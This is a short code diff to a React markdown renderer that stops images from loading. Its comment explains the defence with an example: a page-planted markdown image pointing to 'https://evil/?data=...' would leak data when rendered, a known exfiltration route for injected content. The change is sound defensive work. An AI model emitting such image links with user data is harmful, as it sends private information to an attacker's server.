@@ -41,6 +41,8 @@ export const MarkdownRenderer: React.FC<MarkdownRendererProps> = ({
       rehypePlugins={[rehypeKatex]}
       className="prose prose-invert prose-slate max-w-none"
       components={{
+        // Never load images: a page-planted ![](https://evil/?data=...) would leak data when rendered
+        img: () => null,
         h1: ({ children }) => (
           <h1 className="text-2xl font-bold text-slate-100 mt-6 mb-4">
             {children}
